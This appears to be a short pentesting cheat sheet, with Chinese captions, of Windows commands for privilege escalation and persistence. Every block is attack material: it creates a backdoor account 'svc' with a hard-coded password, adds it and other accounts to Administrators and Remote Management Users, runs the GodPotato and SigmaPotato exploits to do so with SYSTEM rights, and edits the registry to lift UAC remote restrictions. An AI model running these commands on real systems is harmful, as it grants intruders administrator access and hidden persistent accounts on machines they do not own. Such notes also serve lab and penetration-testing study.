```
"net localgroup Administrators eric.wallows /add"
```

```
net user svc pwn123456$ /add
net localgroup "Administrators" svc /add
net localgroup "Remote Management Users" svc /add
```

```
net user svc 'pwn123456$' /add; net localgroup 'Administrators' svc /add; net localgroup 'Remote Management Users' svc /add
```

```
cmd.exe /c "net user svc pwn123456$ /add && net localgroup "Administrators" svc /add && net localgroup "Remote Management Users" svc /add"
```

```
.\GodPotato-NET4.exe -cmd "net localgroup Administrators "NT SERVICE\MSSQL`$SQLEXPRESS" /add"
```

添加管理员用户，开启远程桌面连接
.\SigmaPotato "net user sara 1qaz2wsxA /add"
.\SigmaPotato "net localgroup Administrators sara /add"
禁用UAC 远程限制
.\SigmaPotato "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"